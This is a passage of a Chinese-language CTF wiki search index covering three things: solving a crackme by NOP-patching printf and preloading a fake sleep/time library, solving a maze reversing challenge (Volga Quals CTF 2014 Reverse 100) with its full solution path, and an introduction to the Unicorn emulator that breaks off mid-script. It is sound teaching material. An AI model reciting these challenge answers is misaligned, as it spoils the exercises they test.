\u6574\u4e2a\u7684\u4ee3\u7801\u6d41\u7a0b\u4e3b\u8981\u5c31\u662f\u5728\u4e0d\u65ad\u5730\u5faa\u73af\u8f93\u51fa funny \u91cc\u7684\u53e5\u5b50, \u6ee1\u8db3\u5faa\u73af\u6761\u4ef6\u540e\u8f93\u51fa key , \u5e76\u7528 key \u8fdb\u884c\u5f02\u6216\u5f97\u5230 flag \u7684\u503c. \u4f46\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0, \u6574\u4e2a\u5faa\u73af\u7684\u6b21\u6570\u76f8\u5bf9\u6765\u8bf4\u662f\u6bd4\u8f83\u5c11\u7684. \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u4e00\u4e9b\u65b9\u6cd5, \u8ba9\u5faa\u73af\u8fdb\u884c\u5f97\u66f4\u5feb\u4e00\u4e9b. \u6bd4\u5982\u8bf4\u6211\u624b\u52a8patch\u4e00\u4e0b, \u4e0d\u8ba9\u7a0b\u5e8f\u8f93\u51fa\u5b57\u7b26\u4e32(\u5b9e\u9645\u4e0a printf \u7684\u8017\u65f6\u662f\u76f8\u5f53\u591a\u7684), \u5176\u6b21\u5c31\u662f\u4f7f\u7528 LD_PRELOAD \u4f7f\u5f97\u7a0b\u5e8f\u7684 sleep() \u5931\u6548. \u53ef\u4ee5\u5f88\u660e\u663e\u5730\u8282\u7701\u65f6\u95f4. \u624b\u52a8patch\u7684\u8fc7\u7a0b\u6bd4\u8f83\u7b80\u5355. \u6211\u4eec\u53ef\u4ee5\u627e\u5230\u4ee3\u7801\u4f4d\u7f6e, \u7136\u540e\u7528\u4e00\u4e9b\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u8fdb\u884c\u4fee\u6539. \u5f53\u7136\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528 IDA \u6765\u8fdb\u884cpatch\u5de5\u4f5c. .text: 00000000004007 B7 call ___printf_chk .text: 00000000004007 BC xor eax , eax \u5c06\u5149\u6807\u70b9\u5728 call ___printf_chk \u4e0a, \u7136\u540e\u9009\u62e9\u83dc\u5355 Edit->Patch Program->Assemble (\u5f53\u7136\u4f60\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6patch\u65b9\u5f0f. \u6548\u679c\u90fd\u4e00\u6837). \u7136\u540e\u5c06\u5176\u4fee\u6539\u4e3a nop(0x90) , \u5982\u4e0b\u56fe\u6240\u793a \u5c06 4007B7 \u5230 4007BD \u4e4b\u95f4\u7684\u6c47\u7f16\u4ee3\u7801\u5168\u90e8\u4fee\u6539\u4e3a nop \u5373\u53ef. \u7136\u540e\u9009\u62e9\u83dc\u5355 Edit->Patch Program->Apply patches to input file . \u5f53\u7136\u6700\u597d\u505a\u4e00\u4e2a\u5907\u4efd(\u5373\u52fe\u9009 Create a backup ), \u7136\u540e\u70b9\u51fbOK\u5373\u53ef(\u6211\u91cd\u547d\u540d\u4e3a\u4e86 patched.elf , \u4e0b\u8f7d\u94fe\u63a5: patched.elf ). \u73b0\u5728\u8fdb\u5165 LD_PRELOAD \u90e8\u5206. \u8fd9\u91cc\u6211\u4eec\u7b80\u5355\u7f16\u5199\u4e00\u4e0bc\u4ee3\u7801, \u4e0b\u8f7d\u94fe\u63a5: time.c static int t = 0x31337 ; void sleep ( int sec ) { t += sec ; } int time () { return t ; } \u7136\u540e\u4f7f\u7528\u547d\u4ee4 gcc --shared time.c -o time.so \u751f\u6210\u52a8\u6001\u94fe\u63a5\u6587\u4ef6. \u5f53\u7136\u4e5f\u7ed9\u51fa\u4e86\u4e0b\u8f7d\u94fe\u63a5: time.so \u7136\u540e\u6253\u5f00linux\u7ec8\u7aef, \u8fd0\u884c\u547d\u4ee4: LD_PRELOAD=./time.so ./patched.elf \u8fc7\u4e00\u4f1a, \u4f60\u5c31\u80fd\u542c\u5230CPU\u75af\u72c2\u8fd0\u8f6c\u7684\u58f0\u97f3, \u7136\u540e\u5f88\u5feb\u5c31\u51fa\u6765\u4e86flag.","title":"\u4f8b\u9898"},{"location":"reverse/maze/maze/","text":"\u8ff7\u5bab\u95ee\u9898 \u00b6 \u8ff7\u5bab\u95ee\u9898\u6709\u4ee5\u4e0b\u7279\u70b9: \u5728\u5185\u5b58\u4e2d\u5e03\u7f6e\u4e00\u5f20\"\u5730\u56fe\" \u5c06\u7528\u6237\u8f93\u5165\u9650\u5236\u5728\u5c11\u6570\u51e0\u4e2a\u5b57\u7b26\u8303\u56f4\u5185. \u4e00\u822c\u53ea\u6709\u4e00\u4e2a\u8ff7\u5bab\u5165\u53e3\u548c\u4e00\u4e2a\u8ff7\u5bab\u51fa\u53e3 \u5e03\u7f6e\u7684\u5730\u56fe\u53ef\u4ee5\u7531\u53ef\u663e\u5b57\u7b26(\u6bd4\u5982 # \u548c * )\u7ec4\u5408\u800c\u6210(\u8fd9\u975e\u5e38\u660e\u663e, \u67e5\u770b\u5b57\u7b26\u4e32\u57fa\u672c\u5c31\u77e5\u9053\u8fd9\u662f\u4e2a\u8ff7\u5bab\u9898\u4e86.), \u4e5f\u53ef\u4ee5\u5355\u7eaf\u7528\u4e0d\u53ef\u663e\u7684\u5341\u516d\u8fdb\u5236\u503c\u8fdb\u884c\u8868\u793a. \u53ef\u4ee5\u5c06\u5730\u56fe\u76f4\u63a5\u7ec4\u6210\u4e00\u6761\u975e\u5e38\u957f\u7684\u5b57\u7b26\u4e32, \u6216\u662f\u4e00\u884c\u4e00\u884c\u5206\u5f00\u5e03\u7f6e. \u5982\u679c\u662f\u4e00\u884c\u4e00\u884c\u5206\u5f00\u5e03\u7f6e\u7684\u8bdd, \u56e0\u4e3a\u8ff7\u5bab\u4e00\u822c\u90fd\u4f1a\u6bd4\u8f83\u5927, \u6240\u4ee5\u7528\u4e8e\u6309\u884c(\u6ce8\u610f, \u5e03\u7f6e\u5e76\u975e\u6309\u987a\u5e8f\u5e03\u7f6e, \u6bcf\u884c\u90fd\u5bf9\u5e94\u4e00\u4e2a\u5177\u4f53\u7684\u884c\u53f7, \u4f60\u9700\u8981\u786e\u5b9a\u884c\u53f7\u624d\u80fd\u8fd8\u539f\u8ff7\u5bab\u5730\u56fe)\u5e03\u7f6e\u8ff7\u5bab\u7684\u51fd\u6570\u4f1a\u660e\u663e\u91cd\u590d\u591a\u6b21. \u800c\u88ab\u9650\u5236\u7684\u5b57\u7b26\u901a\u5e38\u4f1a\u662f\u4e00\u4e9b\u65b9\u4fbf\u8bb0\u5fc6\u7684\u7ec4\u5408(\u4e0d\u662f\u4e5f\u6ca1\u529e\u6cd5), \u6bd4\u5982 w/s/a/d , h/j/k/l , l/r/u/d \u8fd9\u6837\u7684\u7c7b\u4f3c\u7ec4\u5408. \u5f53\u7136\u5404\u4e2a\u952e\u5177\u4f53\u7684\u64cd\u4f5c\u9700\u8981\u7ecf\u8fc7\u5206\u6790\u5224\u65ad(\u50cf\u90a3\u79cd\u53ea\u7528\u4e00\u6761\u5b57\u7b26\u4e32\u8868\u793a\u8ff7\u5bab\u7684, \u5c31\u53ef\u4ee5\u7528 t \u952e\u8868\u793a\u5411\u53f3\u79fb\u52a8 12 \u4e2a\u5b57\u7b26\u8fd9\u6837). \u5bf9\u4e8e\u4e8c\u7ef4\u7684\u5730\u56fe, \u4e00\u822c\u4f5c\u8005\u90fd\u4f1a\u8bbe\u7f6e\u4e00\u4e2a X\u5750\u6807 \u548c\u4e00\u4e2a Y\u5750\u6807 \u7528\u4e8e\u4fdd\u5b58\u5f53\u524d\u4f4d\u7f6e. \u6211\u4eec\u4e5f\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u7279\u70b9\u6765\u5165\u624b\u5206\u6790. \u4e00\u822c\u60c5\u51b5\u4e0b, \u8ff7\u5bab\u662f\u53ea\u67091\u4e2a\u5165\u53e3\u548c1\u4e2a\u51fa\u53e3, \u50cf\u5165\u53e3\u5728\u6700\u5de6\u4e0a\u89d2 (0, 0) \u4f4d\u7f6e, \u800c\u51fa\u53e3\u5728\u6700\u53f3\u4e0b\u89d2 (max_X, max_Y) \u5904. \u4f46\u4e5f\u6709\u53ef\u80fd\u662f\u51fa\u53e3\u5728\u8ff7\u5bab\u7684\u6b63\u4e2d\u5fc3, \u7528\u4e00\u4e2a Y \u5b57\u7b26\u8868\u793a\u7b49\u7b49. \u89e3\u7b54\u8ff7\u5bab\u9898\u7684\u6761\u4ef6\u4e5f\u662f\u9700\u8981\u6839\u636e\u5177\u4f53\u60c5\u51b5\u5224\u65ad\u7684. \u5f53\u7136\u8ff7\u5bab\u7684\u8d70\u6cd5\u53ef\u80fd\u4e0d\u6b621\u6761, \u4e5f\u6709\u60c5\u51b5\u662f\u6709\u591a\u6761\u8d70\u6cd5, \u4f46\u662f\u8981\u6c42\u67d0\u4e00\u4e2a\u8d70\u6cd5\u6bd4\u5982\u8bf4\u4ee3\u4ef7\u6700\u5c0f. \u90a3\u4e48\u8fd9\u5c31\u53ef\u4ee5\u53d8\u76f8\u4e3a\u4e00\u4e2a\u7b97\u6cd5\u95ee\u9898. Volga Quals CTF 2014: Reverse 100 \u00b6 \u63a5\u4e0b\u6765\u6211\u4eec\u4ee5\u8fd9\u9053\u9898\u8fdb\u884c\u793a\u4f8b, \u8fd9\u662f\u4e00\u9053\u7b80\u5355\u7684\u8ff7\u5bab\u9898. \u8be5\u9898\u5bf9\u5730\u56fe\u6309\u884c\u4e71\u5e8f\u5e03\u7f6e, \u4f7f\u7528\u7684\u5b57\u7b26\u662f # \u548c * . \u5bf9\u5e94\u7684 crackme \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: rev100 \u5bf9\u5e94\u7684 idb \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: rev100.i64 \u6211\u4eec\u53ef\u4ee5\u5230 .rodata \u6bb5\u7528\u5149\u6807\u9009\u62e9\u6240\u6709\u7684\u5730\u56fe\u5b57\u7b26\u4e32, \u6309\u4e0b shift+E \u63d0\u53d6\u6240\u6709\u7684\u5730\u56fe\u6570\u636e. \u4f46\u662f\u76ee\u524d\u63d0\u53d6\u5230\u7684\u5730\u56fe\u5b57\u7b26\u4e32, \u4ece\u4e0a\u5f80\u4e0b\u5e76\u975e\u662f\u6309\u987a\u5e8f\u7684, \u56e0\u6b64\u6211\u4eec\u9700\u8981\u56de\u5230IDA\u751f\u6210\u7684\u4f2aC\u4ee3\u7801, \u83b7\u53d6\u884c\u53f7\u5e76\u91cd\u65b0\u6392\u5e8f\u7ec4\u5408\u8d77\u6765. \u6700\u540e\u5f97\u5230\u7684\u5b8c\u6574\u5730\u56fe\u5982\u4e0b: \u5bf9\u5e94\u7684 \u8ff7\u5bab\u5730\u56fe\u6587\u4ef6 \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: maze_array.txt \u518d\u6765\u770b\u8ff7\u5bab\u79fb\u52a8\u6240\u9700\u8981\u7684\u5b57\u7b26: \u8fd9\u91cc\u6211\u4eec\u77e5\u9053, \u53ef\u4ee5\u4f7f\u7528\u7684\u5b57\u7b26\u6709 L/R/U/D , \u5206\u522b\u5bf9\u5e94\u4e8e \u5de6/\u53f3/\u4e0a/\u4e0b . \u518d\u5f80\u4e0b\u770b \u901a\u8fc7\u8c03\u8bd5\u662f\u53ef\u4ee5\u77e5\u9053, \u8fd9\u91cc\u5176\u5b9e\u662f\u6bcf\u6b21\u5728\u7528\u6237\u8f93\u5165 L/R/U/D \u540e, \u5148\u6253\u5370\u4e00\u6b21\u4f60\u7684\u8f93\u5165, \u7136\u540e\u6253\u5370\u5bf9\u5e94\u7684 X/Y\u5750\u6807 . \u800c\u6700\u540e\u7684\u5224\u5b9a\u6210\u529f\u7684\u6761\u4ef6, \u5c31\u662f\u5f53 pos_x == 89 && pos_y == 28 . \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6839\u636e\u4e0a\u8ff0\u4fe1\u606f, \u83b7\u5f97\u8d70\u51fa\u8ff7\u5bab\u7684\u8def\u5f84. \u6700\u540e\u5f97\u5230\u7684\u8ff7\u5bab\u8def\u5f84\u5c31\u662f RDDRRRRRRRRRRRRRRRRRRDDDDDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRUUUUUULLLLLLLLLDDRRRRRRDDLLLLLLLLLLLLLUURRRUUUUURRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDDDDDDDDDDRRRRRRRRRRRRRRRRUUUUUUUUUUUUULLLLLLLUUUURRRRRRRRRRRRDDDDDDDDDDDDDDDDDDDLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLUUUURRRRRRRRRRRRRRRRRRRRRDRRRRRRRRRRRRRRUUULLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLDDDDDRRRRRUUURRRRDDDDDLLLLLLLLLDDDDRRRRRRRRRRUUURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRR \u53c2\u8003\u94fe\u63a5 \u00b6 [ VolgaCTF Quals 2014 writeup - Reverse-100 ]","title":"\u8ff7\u5bab\u95ee\u9898"},{"location":"reverse/maze/maze/#_1","text":"\u8ff7\u5bab\u95ee\u9898\u6709\u4ee5\u4e0b\u7279\u70b9: \u5728\u5185\u5b58\u4e2d\u5e03\u7f6e\u4e00\u5f20\"\u5730\u56fe\" \u5c06\u7528\u6237\u8f93\u5165\u9650\u5236\u5728\u5c11\u6570\u51e0\u4e2a\u5b57\u7b26\u8303\u56f4\u5185. \u4e00\u822c\u53ea\u6709\u4e00\u4e2a\u8ff7\u5bab\u5165\u53e3\u548c\u4e00\u4e2a\u8ff7\u5bab\u51fa\u53e3 \u5e03\u7f6e\u7684\u5730\u56fe\u53ef\u4ee5\u7531\u53ef\u663e\u5b57\u7b26(\u6bd4\u5982 # \u548c * )\u7ec4\u5408\u800c\u6210(\u8fd9\u975e\u5e38\u660e\u663e, \u67e5\u770b\u5b57\u7b26\u4e32\u57fa\u672c\u5c31\u77e5\u9053\u8fd9\u662f\u4e2a\u8ff7\u5bab\u9898\u4e86.), \u4e5f\u53ef\u4ee5\u5355\u7eaf\u7528\u4e0d\u53ef\u663e\u7684\u5341\u516d\u8fdb\u5236\u503c\u8fdb\u884c\u8868\u793a. \u53ef\u4ee5\u5c06\u5730\u56fe\u76f4\u63a5\u7ec4\u6210\u4e00\u6761\u975e\u5e38\u957f\u7684\u5b57\u7b26\u4e32, \u6216\u662f\u4e00\u884c\u4e00\u884c\u5206\u5f00\u5e03\u7f6e. \u5982\u679c\u662f\u4e00\u884c\u4e00\u884c\u5206\u5f00\u5e03\u7f6e\u7684\u8bdd, \u56e0\u4e3a\u8ff7\u5bab\u4e00\u822c\u90fd\u4f1a\u6bd4\u8f83\u5927, \u6240\u4ee5\u7528\u4e8e\u6309\u884c(\u6ce8\u610f, \u5e03\u7f6e\u5e76\u975e\u6309\u987a\u5e8f\u5e03\u7f6e, \u6bcf\u884c\u90fd\u5bf9\u5e94\u4e00\u4e2a\u5177\u4f53\u7684\u884c\u53f7, \u4f60\u9700\u8981\u786e\u5b9a\u884c\u53f7\u624d\u80fd\u8fd8\u539f\u8ff7\u5bab\u5730\u56fe)\u5e03\u7f6e\u8ff7\u5bab\u7684\u51fd\u6570\u4f1a\u660e\u663e\u91cd\u590d\u591a\u6b21. \u800c\u88ab\u9650\u5236\u7684\u5b57\u7b26\u901a\u5e38\u4f1a\u662f\u4e00\u4e9b\u65b9\u4fbf\u8bb0\u5fc6\u7684\u7ec4\u5408(\u4e0d\u662f\u4e5f\u6ca1\u529e\u6cd5), \u6bd4\u5982 w/s/a/d , h/j/k/l , l/r/u/d \u8fd9\u6837\u7684\u7c7b\u4f3c\u7ec4\u5408. \u5f53\u7136\u5404\u4e2a\u952e\u5177\u4f53\u7684\u64cd\u4f5c\u9700\u8981\u7ecf\u8fc7\u5206\u6790\u5224\u65ad(\u50cf\u90a3\u79cd\u53ea\u7528\u4e00\u6761\u5b57\u7b26\u4e32\u8868\u793a\u8ff7\u5bab\u7684, \u5c31\u53ef\u4ee5\u7528 t \u952e\u8868\u793a\u5411\u53f3\u79fb\u52a8 12 \u4e2a\u5b57\u7b26\u8fd9\u6837). \u5bf9\u4e8e\u4e8c\u7ef4\u7684\u5730\u56fe, \u4e00\u822c\u4f5c\u8005\u90fd\u4f1a\u8bbe\u7f6e\u4e00\u4e2a X\u5750\u6807 \u548c\u4e00\u4e2a Y\u5750\u6807 \u7528\u4e8e\u4fdd\u5b58\u5f53\u524d\u4f4d\u7f6e. \u6211\u4eec\u4e5f\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u7279\u70b9\u6765\u5165\u624b\u5206\u6790. \u4e00\u822c\u60c5\u51b5\u4e0b, \u8ff7\u5bab\u662f\u53ea\u67091\u4e2a\u5165\u53e3\u548c1\u4e2a\u51fa\u53e3, \u50cf\u5165\u53e3\u5728\u6700\u5de6\u4e0a\u89d2 (0, 0) \u4f4d\u7f6e, \u800c\u51fa\u53e3\u5728\u6700\u53f3\u4e0b\u89d2 (max_X, max_Y) \u5904. \u4f46\u4e5f\u6709\u53ef\u80fd\u662f\u51fa\u53e3\u5728\u8ff7\u5bab\u7684\u6b63\u4e2d\u5fc3, \u7528\u4e00\u4e2a Y \u5b57\u7b26\u8868\u793a\u7b49\u7b49. \u89e3\u7b54\u8ff7\u5bab\u9898\u7684\u6761\u4ef6\u4e5f\u662f\u9700\u8981\u6839\u636e\u5177\u4f53\u60c5\u51b5\u5224\u65ad\u7684. \u5f53\u7136\u8ff7\u5bab\u7684\u8d70\u6cd5\u53ef\u80fd\u4e0d\u6b621\u6761, \u4e5f\u6709\u60c5\u51b5\u662f\u6709\u591a\u6761\u8d70\u6cd5, \u4f46\u662f\u8981\u6c42\u67d0\u4e00\u4e2a\u8d70\u6cd5\u6bd4\u5982\u8bf4\u4ee3\u4ef7\u6700\u5c0f. \u90a3\u4e48\u8fd9\u5c31\u53ef\u4ee5\u53d8\u76f8\u4e3a\u4e00\u4e2a\u7b97\u6cd5\u95ee\u9898.","title":"\u8ff7\u5bab\u95ee\u9898"},{"location":"reverse/maze/maze/#volga-quals-ctf-2014-reverse-100","text":"\u63a5\u4e0b\u6765\u6211\u4eec\u4ee5\u8fd9\u9053\u9898\u8fdb\u884c\u793a\u4f8b, \u8fd9\u662f\u4e00\u9053\u7b80\u5355\u7684\u8ff7\u5bab\u9898. \u8be5\u9898\u5bf9\u5730\u56fe\u6309\u884c\u4e71\u5e8f\u5e03\u7f6e, \u4f7f\u7528\u7684\u5b57\u7b26\u662f # \u548c * . \u5bf9\u5e94\u7684 crackme \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: rev100 \u5bf9\u5e94\u7684 idb \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: rev100.i64 \u6211\u4eec\u53ef\u4ee5\u5230 .rodata \u6bb5\u7528\u5149\u6807\u9009\u62e9\u6240\u6709\u7684\u5730\u56fe\u5b57\u7b26\u4e32, \u6309\u4e0b shift+E \u63d0\u53d6\u6240\u6709\u7684\u5730\u56fe\u6570\u636e. \u4f46\u662f\u76ee\u524d\u63d0\u53d6\u5230\u7684\u5730\u56fe\u5b57\u7b26\u4e32, \u4ece\u4e0a\u5f80\u4e0b\u5e76\u975e\u662f\u6309\u987a\u5e8f\u7684, \u56e0\u6b64\u6211\u4eec\u9700\u8981\u56de\u5230IDA\u751f\u6210\u7684\u4f2aC\u4ee3\u7801, \u83b7\u53d6\u884c\u53f7\u5e76\u91cd\u65b0\u6392\u5e8f\u7ec4\u5408\u8d77\u6765. \u6700\u540e\u5f97\u5230\u7684\u5b8c\u6574\u5730\u56fe\u5982\u4e0b: \u5bf9\u5e94\u7684 \u8ff7\u5bab\u5730\u56fe\u6587\u4ef6 \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: maze_array.txt \u518d\u6765\u770b\u8ff7\u5bab\u79fb\u52a8\u6240\u9700\u8981\u7684\u5b57\u7b26: \u8fd9\u91cc\u6211\u4eec\u77e5\u9053, \u53ef\u4ee5\u4f7f\u7528\u7684\u5b57\u7b26\u6709 L/R/U/D , \u5206\u522b\u5bf9\u5e94\u4e8e \u5de6/\u53f3/\u4e0a/\u4e0b . \u518d\u5f80\u4e0b\u770b \u901a\u8fc7\u8c03\u8bd5\u662f\u53ef\u4ee5\u77e5\u9053, \u8fd9\u91cc\u5176\u5b9e\u662f\u6bcf\u6b21\u5728\u7528\u6237\u8f93\u5165 L/R/U/D \u540e, \u5148\u6253\u5370\u4e00\u6b21\u4f60\u7684\u8f93\u5165, \u7136\u540e\u6253\u5370\u5bf9\u5e94\u7684 X/Y\u5750\u6807 . \u800c\u6700\u540e\u7684\u5224\u5b9a\u6210\u529f\u7684\u6761\u4ef6, \u5c31\u662f\u5f53 pos_x == 89 && pos_y == 28 . \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6839\u636e\u4e0a\u8ff0\u4fe1\u606f, \u83b7\u5f97\u8d70\u51fa\u8ff7\u5bab\u7684\u8def\u5f84. \u6700\u540e\u5f97\u5230\u7684\u8ff7\u5bab\u8def\u5f84\u5c31\u662f RDDRRRRRRRRRRRRRRRRRRDDDDDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRUUUUUULLLLLLLLLDDRRRRRRDDLLLLLLLLLLLLLUURRRUUUUURRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDDDDDDDDDDRRRRRRRRRRRRRRRRUUUUUUUUUUUUULLLLLLLUUUURRRRRRRRRRRRDDDDDDDDDDDDDDDDDDDLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLUUUURRRRRRRRRRRRRRRRRRRRRDRRRRRRRRRRRRRRUUULLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLDDDDDRRRRRUUURRRRDDDDDLLLLLLLLLDDDDRRRRRRRRRRUUURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRR","title":"Volga Quals CTF 2014: Reverse 100"},{"location":"reverse/maze/maze/#_2","text":"[ VolgaCTF Quals 2014 writeup - Reverse-100 ]","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"reverse/unicorn/introduction/","text":"Unicorn Engine\u7b80\u4ecb \u00b6 \u4ec0\u4e48\u662fUnicorn\u5f15\u64ce \u00b6 Unicorn\u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7, \u591a\u5e73\u53f0, \u591a\u67b6\u6784\u7684CPU\u6a21\u62df\u5668\u6846\u67b6. \u6211\u4eec\u53ef\u4ee5\u66f4\u597d\u5730\u5173\u6ce8CPU\u64cd\u4f5c, \u5ffd\u7565\u673a\u5668\u8bbe\u5907\u7684\u5dee\u5f02. \u60f3\u8c61\u4e00\u4e0b, \u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u5e94\u7528\u4e8e\u8fd9\u4e9b\u60c5\u666f: \u6bd4\u5982\u6211\u4eec\u5355\u7eaf\u53ea\u662f\u9700\u8981\u6a21\u62df\u4ee3\u7801\u7684\u6267\u884c\u800c\u975e\u9700\u8981\u4e00\u4e2a\u771f\u7684CPU\u53bb\u5b8c\u6210\u90a3\u4e9b\u64cd\u4f5c, \u53c8\u6216\u8005\u60f3\u8981\u66f4\u5b89\u5168\u5730\u5206\u6790\u6076\u610f\u4ee3\u7801, \u68c0\u6d4b\u75c5\u6bd2\u7279\u5f81, \u6216\u8005\u60f3\u8981\u5728\u9006\u5411\u8fc7\u7a0b\u4e2d\u9a8c\u8bc1\u67d0\u4e9b\u4ee3\u7801\u7684\u542b\u4e49. \u4f7f\u7528CPU\u6a21\u62df\u5668\u53ef\u4ee5\u5f88\u597d\u5730\u5e2e\u52a9\u6211\u4eec\u63d0\u4f9b\u4fbf\u6377. \u5b83\u7684\u4eae\u70b9(\u8fd9\u4e5f\u5f52\u529f\u4e8eUnicorn\u662f\u57fa\u4e8e qemu \u800c\u5f00\u53d1\u7684)\u6709: \u652f\u6301\u591a\u79cd\u67b6\u6784: Arm, Arm64 (Armv8), M68K, Mips, Sparc, & X86 (include X86_64). \u5bf9Windows\u548c nix\u7cfb\u7edf(\u5df2\u786e\u8ba4\u5305\u542bMac OSX, Linux, BSD & Solaris)\u7684\u539f\u751f\u652f\u6301 \u5177\u6709\u5e73\u53f0\u72ec\u7acb\u4e14\u7b80\u6d01\u6613\u4e8e\u4f7f\u7528\u7684API \u4f7f\u7528JIT\u7f16\u8bd1\u6280\u672f, \u6027\u80fd\u8868\u73b0\u4f18\u5f02 \u4f60\u53ef\u4ee5\u5728 Black Hat USA 2015 \u83b7\u6089\u6709\u5173Unicorn\u5f15\u64ce\u7684\u66f4\u591a\u6280\u672f\u7ec6\u8282. Github\u9879\u76ee\u4e3b\u9875: unicorn \u5c3d\u7ba1\u5b83\u4e0d\u540c\u5bfb\u5e38, \u4f46\u5b83\u65e0\u6cd5\u6a21\u62df\u6574\u4e2a\u7a0b\u5e8f\u6216\u7cfb\u7edf, \u4e5f\u4e0d\u652f\u6301\u7cfb\u7edf\u8c03\u7528. \u4f60\u9700\u8981\u624b\u52a8\u6620\u5c04\u5185\u5b58\u5e76\u5199\u5165\u6570\u636e\u8fdb\u53bb, \u968f\u540e\u4f60\u624d\u80fd\u4ece\u6307\u5b9a\u5730\u5740\u5f00\u59cb\u6a21\u62df. \u5e94\u7528\u7684\u60c5\u666f \u00b6 \u4ec0\u4e48\u65f6\u5019\u80fd\u591f\u7528\u5230Unicorn\u5f15\u64ce\u5462? \u4f60\u53ef\u4ee5\u8c03\u7528\u6076\u610f\u8f6f\u4ef6\u4e2d\u4e00\u4e9b\u6709\u8da3\u7684\u51fd\u6570, \u800c\u4e0d\u7528\u521b\u5efa\u4e00\u4e2a\u6709\u5bb3\u7684\u8fdb\u7a0b. \u7528\u4e8eCTF\u7ade\u8d5b \u7528\u4e8e\u6a21\u7cca\u6d4b\u8bd5 \u7528\u4e8egdb\u63d2\u4ef6, \u57fa\u4e8e\u4ee3\u7801\u6a21\u62df\u6267\u884c\u7684\u63d2\u4ef6 \u6a21\u62df\u6267\u884c\u4e00\u4e9b\u6df7\u6dc6\u4ee3\u7801 \u5982\u4f55\u5b89\u88c5 \u00b6 \u5b89\u88c5Unicorn\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u5c31\u662f\u4f7f\u7528pip\u5b89\u88c5, \u53ea\u8981\u5728\u547d\u4ee4\u884c\u4e2d\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u5373\u53ef(\u8fd9\u662f\u9002\u5408\u4e8e\u559c\u7231\u7528python\u7684\u7528\u6237\u7684\u5b89\u88c5\u65b9\u6cd5, \u5bf9\u4e8e\u90a3\u4e9b\u60f3\u8981\u4f7f\u7528C\u7684\u7528\u6237, \u5219\u9700\u8981\u53bb\u5b98\u7f51\u67e5\u770b\u6587\u6863\u7f16\u8bd1\u6e90\u7801\u5305): pip install unicorn \u4f46\u5982\u679c\u4f60\u60f3\u7528\u6e90\u4ee3\u7801\u8fdb\u884c\u672c\u5730\u7f16\u8bd1\u7684\u8bdd, \u4f60\u9700\u8981\u5728 \u4e0b\u8f7d \u9875\u9762\u4e2d\u4e0b\u8f7d\u6e90\u4ee3\u7801\u5305, \u7136\u540e\u53ef\u4ee5\u6309\u7167\u4ee5\u4e0b\u547d\u4ee4\u6267\u884c: *nix \u5e73\u53f0\u7528\u6237 $ cd bindings/python $ sudo make install Windows\u5e73\u53f0\u7528\u6237 cd bindings/python python setup.py install \u5bf9\u4e8eWindows, \u5728\u6267\u884c\u5b8c\u4e0a\u8ff0\u547d\u4ee4\u540e, \u8fd8\u9700\u8981\u5c06 \u4e0b\u8f7d \u9875\u9762\u7684 Windows core engine \u7684\u6240\u6709dll\u6587\u4ef6\u590d\u5236\u5230 C:\\locationtopython\\Lib\\site-packages\\unicorn \u4f4d\u7f6e\u5904. \u4f7f\u7528unicorn\u7684\u5feb\u901f\u6307\u5357 \u00b6 \u6211\u4eec\u5c06\u4f1a\u5c55\u793a\u5982\u4f55\u4f7f\u7528python\u8c03\u7528unicorn\u7684api\u4ee5\u53ca\u5b83\u662f\u5982\u4f55\u8f7b\u6613\u5730\u6a21\u62df\u4e8c\u8fdb\u5236\u4ee3\u7801. \u5f53\u7136\u8fd9\u91cc\u7528\u7684api\u4ec5\u662f\u4e00\u5c0f\u90e8\u5206, \u4f46\u5bf9\u4e8e\u5165\u95e8\u5df2\u7ecf\u8db3\u591f\u4e86. 1 from __future__ import print_function 2 from unicorn import * 3 from unicorn.x86_const import * 4 5 # code to be emulated 6 X86_CODE32 = b \" \\x41\\x4a \" # INC ecx; DEC edx 7 8 # memory address where emulation starts 9 ADDRESS = 0x1000000 10 11 print ( \"Emulate i386 code\" ) 12 try : 13 # Initialize emulator in X86-32bit mode 14 mu = Uc ( UC_ARCH_X86 , UC_MODE_32 ) 15 16 # map 2MB memory for this emulation 17 mu . mem_map ( ADDRESS , 2 * 1024 * 1024 ) 18 19 # write machine code to be emulated to memory 20 mu . mem_write ( ADDRESS , X86_CODE32 ) 21 22 # initialize machine registers 23 mu . reg_write ( UC_X86_REG_ECX , 0x1234 ) 24 mu . reg_write ( UC_X86_REG_EDX , 0x7890 ) 25 26 # emulate code in infinite time & unlimited instructions 27 mu . emu_start ( ADDRESS , 